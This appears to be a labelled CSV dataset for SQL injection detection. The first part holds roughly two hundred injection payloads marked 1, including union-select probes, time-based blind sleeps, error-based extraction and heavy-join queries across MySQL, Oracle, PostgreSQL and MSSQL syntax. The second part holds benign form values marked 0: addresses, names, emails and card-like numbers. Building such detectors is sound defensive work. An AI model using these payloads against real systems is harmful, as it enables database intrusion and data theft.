"1))) union all select null,null,null,null,null,null,null,null,null#",1
1' where 4473=4473 and (select * from (select(sleep(5)))gcrr)#,1
"1%"") procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (""%""=""",1
"-1963 union all select 6831,6831,6831,6831,6831,6831,6831,6831#",1
"1%"" and 3824=benchmark(5000000,md5(0x76555642)) and ""%""=""",1
"-6118 union all select 5906,5906,5906,5906,5906#",1
1) as pqle where 4039=4039 and 7533=7533--,1
"-9265"") or 7834=1685",1
"1') and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
"1)) as wajy where 8593=8593;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",1
"1' in boolean mode);select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3#",1
"-2424) where 8132=8132 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",1
"1)) and elt(9288=6067,6067) and ((1895=1895",1
-3666') where 6386=6386 union all select 6386--,1
1'||(select 'ylio' from dual where 3767=3767 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))))||',1
"-7184) as fshx where 3408=3408 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",1
"1"" and make_set(8403=8403,8899) and ""bbgg""=""bbgg",1
"1%"") and elt(7436=9874,9874) and (""%""=""",1
"1"";call regexp_substring(repeat(right(char(3702),0),500000000),null) and ""rugr""=""rugr",1
"-8178) union all select 4163,4163,4163,4163,4163,4163,4163--",1
1) as jtfx where 8038=8038;select sleep(5)--,1
1')));begin user_lock.sleep(5); end and ((('gqhc'='gqhc,1
"-9840)) as thod where 4790=4790 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",1
"1;select like('abcdefg',upper(hex(randomblob(500000000/2))))",1
"1;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",1
"1 where 6044=6044 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",1
"1'));select count(*) from generate_series(1,5000000) and (('wmoo' like 'wmoo",1
1' where 7191=7191 rlike sleep(5)--,1
"1)(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))",1
"-6642') where 3459=3459 union all select 3459,3459,3459,3459,3459,3459,3459,3459,3459#",1
"-1859' union all select 1781,1781,1781,1781#",1
"-7016%"")) union all select 8847,8847,8847--",1
"(select (case when (1343=1343) then (select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) else 1343 end) from dual)",1
1')));select case when 2948=7279 then 1 else null end--,1
"1';select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5",1
1) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))),1
"1"") and 7533=7533 and (""jfsw"" like ""jfsw",1
"1%"";select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",1
1') and 5999=5879,1
"-4413%')) union all select 1345,1345#",1
"-6388'+(select 'jqld' where 8600=8600 union all select 8600,8600#",1
"1%"")));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",1
"1')) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (('tpcm' like 'tpcm",1
"-2453"") union all select 4520,4520,4520,4520,4520,4520,4520,4520,4520,4520--",1
1');(select * from (select(sleep(5)))srmq) and ('kerg' like 'kerg,1
-7103)) or 4610=1871 and ((1249=1249,1
"-5385"" union all select 4577,4577,4577,4577,4577,4577,4577#",1
"1' where 8451=8451 union all select null,null,null,null,null,null,null,null,null#",1
-4410 where 5749=5749 or 1317=9823--,1
"1"")) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((""yrgy"" like ""yrgy",1
"-8129'))) union all select 4531,4531,4531#",1
1')));select case when 3819=1887 then 1 else null end--,1
"-1490'||(select 'uzbm' from dual where 3181=3181 union all select 3181,3181,3181,3181,3181--",1
"1')));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",1
1')) and sleep(5) and (('jiio' like 'jiio,1
-8513) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (5818=5818,1
-7378' or 6872=6872 and 'bnmn' like 'bnmn,1
"1%') and make_set(8403=8403,8899) and ('%'='",1
"1"" or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)",1
"1'+(select 'ixza' where 4374=4374 union all select null,null,null--",1
"1' in boolean mode) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
"-3347'+(select xuzs where 1076=1076 union all select 1076,1076,1076,1076,1076--",1
1'+(select qsmo where 3172=3172;select (case when (4780=4432) then 4780 else 4780*(select 4780 from mysql.db) end)#,1
"-5082)) union all select 4013,4013,4013,4013,4013,4013,4013,4013,4013,4013#",1
"1' in boolean mode) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)#",1
"1"") and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (""hybu"" like ""hybu",1
"1') as hvyx where 3194=3194 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
"1';select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",1
"-7518"" or elt(8413=3995,3995) and ""cpnf""=""cpnf",1
"-9175')) union all select 6174,6174,6174,6174--",1
"1' and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and 'lwir' like 'lwir",1
1'+(select ijoh where 7145=7145 order by 1--,1
1'||(select 'bupa' from dual where 8548=8548;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,1
"1)))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (((3023=3023",1
-9389') or 8859=3989--,1
1'||(select 'bezt' where 7876=7876;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,1
1)) or sleep(5)#,1
1')) as rxxd where 5049=5049;select pg_sleep(5)--,1
-6081 where 3681=3681 or 2603=3138--,1
1 where 4785=4785 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,1
"1"") where 1212=1212 and 8475=5864",1
"1"" where 3990=3990 and 8594=(select 8594 from pg_sleep(5))--",1
"1) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (1624=1624",1
1;select (case when (7254=5901) then 1 else 7254*(select 7254 from master..sysdatabases) end)--,1
"-3071)) as uiiu where 8910=8910 union all select 8910,8910,8910,8910,8910,8910,8910#",1
"-6928"")) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((""mxhr"" like ""mxhr",1
1')) and sleep(5) and (('tcwt'='tcwt,1
1') or (select * from (select(sleep(5)))ydpu) and ('zaes'='zaes,1
"1) as nmlm where 9872=9872;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
"1' where 6902=6902 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",1
"1) and elt(7425=8842,8842) and (9194=9194",1
"1%')) union all select null,null,null,null,null,null,null--",1
1') rlike (select (case when (7447=3981) then 1 else 0x28 end)),1
"1%"") rlike (select * from (select(sleep(5)))sgvo) and (""%""=""",1
"-3865') union all select 4935,4935,4935,4935,4935--",1
"1"")) waitfor delay '0:0:5' and ((""witb""=""witb",1
"1%') union all select null,null,null#",1
"1""));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1
"1"")));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (((""ymss""=""ymss",1
1)) as pmff where 6649=6649;begin user_lock.sleep(5); end--,1
"-5761"") or 3762=1274",1
"1) where 9829=9829 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
"-7347"")) union all select 4360,4360,4360,4360,4360,4360,4360,4360,4360#",1
1')) rlike (select * from (select(sleep(5)))sgvo) and (('hqcz'='hqcz,1
"1""))) and 2006=2006",1
"1' in boolean mode);select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual#",1
"1%"" union all select null#",1
1) where 8320=8320 waitfor delay '0:0:5'--,1
"1' in boolean mode) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
-3520%' or 8571=8571--,1
"1"")) as femc where 1313=1313 and 4595=4595#",1
"-1583') or elt(1032=1032,3623) and ('jrcj' like 'jrcj",1
"1) where 8302=8302 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--",1
"1%')) union all select null,null,null,null,null,null,null,null--",1
"1"") rlike (select * from (select(sleep(5)))sgvo) and (""fkmh""=""fkmh",1
"1');iif(1157=4542,1,1/0)",1
"1"" order by 1#",1
1' and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and 'ymnm'='ymnm,1
"1"")) as rcse where 4559=4559 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",1
"1"") as sstd where 9629=9629 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",1
-1432 order by 1#,1
-9721') or 9287=4362#,1
"1' and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'bpbe' like 'bpbe",1
1) where 2734=2734 waitfor delay '0:0:5'--,1
"1'))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('narn'='narn",1
"1'))) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
-2793') where 2621=2621 union all select 2621#,1
"1)) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((3003=3003",1
"1)) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((5200=5200",1
-5585%'))) or 6990=7727,1
"1"" and 6637=2321",1
"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",1
"1) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (5621=5621",1
"1)) as hqwy where 4433=4433 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",1
1'||(select 'mlwj' from dual where 4247=4247 and 1702=8469)||',1
"1';select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3",1
1');(select * from (select(sleep(5)))srmq) and ('pgth'='pgth,1
"1 where 4331=4331 union all select null,null,null,null,null,null#",1
"1"" where 1809=1809 and make_set(8403=8403,8899)--",1
"1)) as npdl where 5796=5796 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
"1'))) and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
"1') and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)",1
1 where 5700=5700;select pg_sleep(5)--,1
"-8777"") as lalf where 8606=8606 or elt(4397=5823,5823)--",1
"1"") where 9962=9962 and 4595=4595#",1
"1'+(select qdon where 9453=9453;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))+'",1
"1') or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ('bzgs' like 'bzgs",1
1)) as pynj where 7683=7683 waitfor delay '0:0:5'--,1
"-9937')) union all select 3900,3900,3900,3900,3900,3900,3900,3900,3900#",1
"1"")) as itxo where 7916=7916;select count(*) from generate_series(1,5000000)--",1
"1"") where 6823=6823 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
"1'+(select iaeu where 5509=5509 or 8514=benchmark(5000000,md5(0x544d5a4c))#",1
"-6084')) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('dfcp'='dfcp",1
1')) or (select * from (select(sleep(5)))ydpu) and (('yqbo'='yqbo,1
"1 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)-- yekf",1
"-4166%"") union all select 5190--",1
"1 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))# lgoz",1
"-4072%""))) or 3999=1979",1
"-1763%"" or (8459=8459)*4906 and ""%""=""",1
"1') as siyk where 1514=1514 union all select null,null,null,null,null,null#",1
"1%"")));call regexp_substring(repeat(right(char(3702),0),500000000),null) and (((""%""=""",1
"1',row(7937,5067)>(select count(*),concat(0x7171706a71,(select (elt(7937=7937,1))),0x717a767a71,floor(rand(0)*2))x from (select 9974 union select 5497 union select 8209 union select 8147)a group by x)",1
1'||(select 'owzs' where 1475=1475 union all select null--,1
"1'||(select 'akye' where 9242=9242 union all select null,null,null,null,null,null#",1
"1) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",1
"1"") where 3321=3321;begin dbms_lock.sleep(5); end--",1
"-6996%"" or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1
1))) and 6969=(select 6969 from pg_sleep(5)) and (((5333=5333,1
1' and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric),1
"1"") and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (""diiv""=""diiv",1
"1"")) as xhat where 6674=6674 union all select null,null,null#",1
"1') as rqzz where 4987=4987 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",1
"1 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))",1
"1%') or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
"1' where 8430=8430 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
"1' where 2774=2774 union all select null,null,null,null,null#",1
"1%') or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ('%'='",1
"1 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",1
"1')) as bsvk where 5985=5985 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",1
"-9837"" where 7201=7201 union all select 7201,7201,7201--",1
"1'||(select 'scqw' where 3337=3337 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",1
"1%"");select sleep(5) and (""%""=""",1
1' and 7528=2894 and 'qoyw'='qoyw,1
"1) where 4710=4710 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",1
"-6890""))) union all select 1115#",1
1));waitfor delay '0:0:5'--,1
"-7111 union all select 2409,2409,2409,2409,2409,2409#",1
"1""));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((""soyg""=""soyg",1
"1') as pghp where 9086=9086;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",1
1') where 2330=2330 and (select * from (select(sleep(5)))fzno)--,1
"1'+(select acax where 4169=4169 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))+'",1
1)) and 2006=2006,1
"1';create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and 'gajm'='gajm",1
1' where 6116=6116;select (case when (7033=1594) then 7033 else 7033*(select 7033 from information_schema.character_sets) end)#,1
"1"")));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1
"1%"")));select (case when (8857=1512) then 8857 else 8857*(select 8857 from mysql.db) end)#",1
"1')) as jntr where 5051=5051 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",1
"1) where 1193=1193 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",1
c/ caridad s/n,0
"campello, el",0
40184,0
1442431887503330,0
nue37,0
nuda drudes,0
tufts3@joll.rs,0
22997112x,0
"c/ del ferrocarril, 152,",0
arenas de san juan,0
19245,0
2070765320009143,0
fennell,0
d50allecido,0
1902,0
genny,0
03248i367ca,0
ulldemol bujeque,0
grubel8@albeiteria.kw,0
83497200r,0
plaa caudillo 60,0
martn de yeltes,0
1769471856078209,0
maala8,0
cascabela,0
ludolfo,0
peuela sains,0
snerd@bwds.tj,0
15365381r,0
"c/ 57 15, 9g",0
regueras de arriba,0
08281,0
empeltre,0
7497,0
mckenney,0
estantalar,0
poma gozalbo,0
loti@ajuntamentbarcelona2-0.is,0
21924971z,0
"c/ huertas altas, 114",0
"sequera de haza, la",0
25260,0
8755728520539974,0
kindra,0
h9655,0
josias,0
fonoll zurko,0
dunlap-leaud@videospornocaseros.ye,0
07408152j,0
"c/ aira de villaescusa 199, 1f",0
"pobla de montorns, la",0
09530,0
4190369223587522,0
kong-que,0
5x8r0r,0
5599,0
goggin,0
indocto,0
serneo,0
plebs cadevall,0
marieau8@clementelr.nz,0
24314757p,0
cueva de montesinos 80 11-g,0
04742,0
3363230401310436,0
xiangsen,0
correccionalmente,0
cleofs,0
01633578a,0
"europa, 58 2-f",0
21388,0
5562206225092204,0
vasilopo,0
ladronzue_lo,0
4377,0
elbeze,0
cachapera,0
molledo basagaa,0
hibbert.bupp@hojadecalculo.com.mil,0
56163821y,0
carretera de las ermitas 188,0
zarratn,0
6341227779092516,0
lauriaul,0
er3t3e1,0
atanaspulos,0
nype.shafer@canovash.bv,0
38355013y,0
"plaa catalunya 124, 5-b",0
merindad de ro ubierna,0
19312,0
1437589782727245,0
robieux,0
cuatriduana,0
1565,0
darby,0
ti7o,0
folch pintado,0
thalasso.chappell@titulosoficiales.jp,0
00474767r,0
manuel pereira s/n 12?a,0
0350022340129740,0
esther,0
labranto,0
julisa,0
pelez bastus,0
pianka@noviasteresapalacios.mc,0
03266253t,0
"c/ doctor ferran, 193",0
38787,0
0992218178104844,0
fitzgera,0
13g0e7at42a,0
5788,0
kinnie,0
ret4ne3or,0
graziana,0
vettenranta@infopromo.az,0
"el caaveral 130, 5-f",0
16648,0
9139561296743472,0
valina,0
07u8e37ia,0
yoselie,0
pool echenique,0
07901950r,0
"calle holanda 146,",0
"tres villas, las",0
39638,0
5426744631176158,0
patrica0,0
portal,0
mankowsk,0
4a39c44a,0
marino,0
bow@whitepearlresort.pl,0
01472954b,0
c/ garcia morente 129,0
adradas,0
18417,0
2533839429419532,0
smelters,0
tamboreo,0
natn,0
lamas,0
sipperly.nakamoto@ceramicasmio.ht,0
68201502q,0
carretera 200 hasta km. 1 barra de mio 175,0
manzanilla,0
36680,0
1181707541494323,0
jalaie,0
*r6t58a,0
1613,0
joelly,0
r8cid0va,0
flaviano,0
oshea_knowles@tiaherminia.gh,0
14977979b,0
"calle del llenguadoc s/n, 6e",0
pujalt,0
45183,0
0269447503610316,0
kristel,0
d2s7sp79ro,0
reiji,0
estolano boget,0
spiegel-haake@convention.no,0
62145911a,0
"travesia barrionuevo, 49",0
turcia,0
7738690201675696,0
daisey,0
r92e1*56e,0
2925,0
doris,0
pu6ue97,0
bergad faix,0
sibirskaia@euskalcasino.es,0
72367579b,0
"c/ lope de rueda s/n, 9-f",0
alcntar,0
1721278325772936,0
lozier,0
alguese,0
starr-fjelmose@cdgranadabaila.travel,0
30482828p,0
"c/ ulises 17,",0
47815,0
rube,0
enlutada,0
2354,0
blount,0
sugesto,0
raian,0
suau,0
germain@elcorteitaliano.cat,0
78977050h,0
"c/ de la sabina, s/n 8?b",0
betelu,0
24224,0
mcglynn,0
midkiff_mikuni@directoriogratuito.kh,0
58772485x,0
"calle rascafria, 103,",0
gimialcn,0
39515,0
3582197540300309,0
sprouse,0
zanquita,0
1827,0
addons,0
14ab214c6n,0
karla,0
jauregui cortines,0
quartet@cabare.com.cs,0
86800649y,0
"paratge lila 30, 10?c",0
espluga de francol l',0
9091453994786923,0
dyck,0
acre,0
pereda barrio,0
barrymore@hipermadrid.pe,0
52137467d,0
"doctor waksmann, 120, 7?b",0
caudete,0
31282,0
3161746053397457,0
chao,0
62si27t8ico,0
4403,0
patacki,0
encrasar,0
xifr,0
pleasande@doloresmusculares.aq,0
86943454g,0
"sanchez 49,",0
9008082484622624,0
lubna,0
o+bispar,0
adgardo,0
pealver palenzuela,0
36914497a,0
"nucleo santiago apostol 34, 4?f",0
zabalza,0
20491,0
4811716935763521,0
erickson,0
inord2n6da7e401,0
5445,0
procacci,0
a65esad0,0
efrn,0
conde,0
calle castaos 90,0
torre-cardela,0
25330,0
4867284155125635,0
oran,0
mialgi5,0
tesisteco avi,0
pepet@naturalchild.co,0
pablo iglesias s/n 2?f,0
01308,0
6702564951251728,0
technoso,0
remante,0
919,0
briseboi,0
afoscarse,0
net.valdez@salaparis.gt,0
39699852n,0
"c/ja del indiano, s/n,",0
illano,0
37115,0
2872946473881757,0
spears,0
comisorio,0
triana,0
del ngel kercad,0
pesche@campodegolf.com.sy,0
10421521z,0
"etorbidea askatasuna 170, 8?a",0
valseca,0
2754013363983769,0
huong,0
419747iv6,0
1729,0
tse,0
orientalista,0
victoria de los angeles,0
ventura motn,0
sala@mystyleperfume.ls,0
"roure, 43, 3?d",0
32648,0
7771884953425478,0
meggy,0
3o22ciabl3,0
telema,0
ayat rozas,0
verani@viajesdacapalla.gq,0
25109956m,0
"quinita flores 75,",0
botarell,0
45370,0
3893864101962581,0
etchieso,0
arrego76arse,0
9159,0
marieann,0
1i6p06ej7,0
penarroya ingla,0
gayle@freetag.name,0
54709157t,0
"el halcon 154, 8?f",0
03314,0
1571256483586961,0
evin,0
sa6r2,0
sibonet,0
gorcy.davis@carmensanmartin.bo,0
16601924h,0
"estrada mendiarte s/n, 10?a",0
destriana,0
25307,0
sa89gn,0
9639,0
longo,0
cojera,0
armero filippi,0
uzaki@23horas.ie,0
calle madagascar 130,0
24391,0
lei-see,0
ineluctable,0
rahue,0
serna kovac,0
pozzetto@miplat.am,0
51795949h,0
"calle del derecho 17,",0
cervera de la caada,0
50693,0
9473535060757439,0
havis,0
7a2a6t1ro,0
1858,0
cooksey,0
pavorde,0
elois,0
gomero gallardo,0
terrio@likeanangel.dz,0
46773841y,0
"paratge ter, 33,",0
arndiga,0
8554607392278464,0
vial,0
muntaner nevado,0
vasilescu.lisi@drogasvirtuales.sc,0
37905890g,0
"luis braille, 33, 12?d",0
matar,0
40529,0
4608056297024601,0
werling,0
encalador,0
7012,0
barnhill,0
ten.tar,0
quintilio,0
naharro,0
vitola@23horas.ad,0
38980059g,0
"calle isis, 180",0
45810,0
6172398321911966,0
janeva,0
desconsolar,0
lzaro,0
hinwood-laretei@addl.es,0
infante juan manuel s/n 5?a,0
canfranc,0
26323,0
9738066615220073,0
radioelctrica,0
3679,0
blondell3,0
apotrerar,0
mochn quer,0
peller@arvigar.gs,0
30503437d,0
"carrer asturies, 49",0
49135,0
8582534834926521,0
aghili,0
escultrico,0
colunga corrius,0
bukoontot@google-movil.cm,0
69634179t,0
c/ asuncion 115 5e,0
almonacid de la sierra,0
6689689469452036,0
rorke,0
3u23pe,0
3318,0
philippa,0
carroar,0
salgado pladellorens,0
schwab.carli@emepleo.info,0
"calle batalla de muhlberg, 25, 6?a",0
villadoz,0
27860,0
brenda,0
8ienne2s6,0
alpar-ornstein@rockefeller.nu,0
15423399j,0
horcajo de montemayor,0
46844,0
gourley,0
sensualmente,0
consalve,0
c406l2n5,0
fabrizio,0
kunneke@storagecraft.nz,0
89740217j,0
"c/ gravina, s/n",0
igzquiza,0
17867,0
6453670410602968,0
zandra,0
agenor,0
iraola rudi,0
chamberlain@muevemiweb.al,0
calle jaime ferranz 51,0
castellanos de zapardiel,0
12163,0
8496429893525706,0
tweddle,0
t324a3ra5a,0
4932,0
sirevici,0
di0cut6dor7,0
jener monaj,0
90230020p,0
los polancos 133,0
"pintanos, los",0
6034871098442134,0
berrisfo,0
zaguero,0
vingelli9@custombikesclothes.fr,0
39202408n,0
"c/ montaer ruiz, 24, 12a",0
fuentelmonge,0
3609841962548925,0
isador,0
m*ule38,0
4906,0
marcanti,0
cimorra,0
jezabel,0
pawluszek segu,0
knippenberg@soyriojano.cf,0
05782219l,0
"c/ ricardo codoer, 112,",0
iza,0
brunhild,0
te3496,0
martinn sampayo,0
allaert@chicasdiabolo.ru,0
63974696n,0
"calle plantio, 178,",0
fla,0
50629,0
benning,0
demostrar,0
6212,0
sask,0
refriega,0
isidoro,0
rudie@deuxmanagement.jo,0
06918701w,0
"calle la caldera, 76 11-c",0
guilas,0
4898771590601702,0
lap,0
ramblizo,0
42287106l,0
"calle beato tomas de zumarraga, 89 12-c",0
8043015940180984,0
olsen,0
5urgui8a,0
6087,0
spindler1,0
trincha-32r1,0
stoeckel@hacia.sa,0
08363269d,0
"alqueria de pixarroda, 27",0
tossa de mar,0
0277189059505279,0
dotan,0
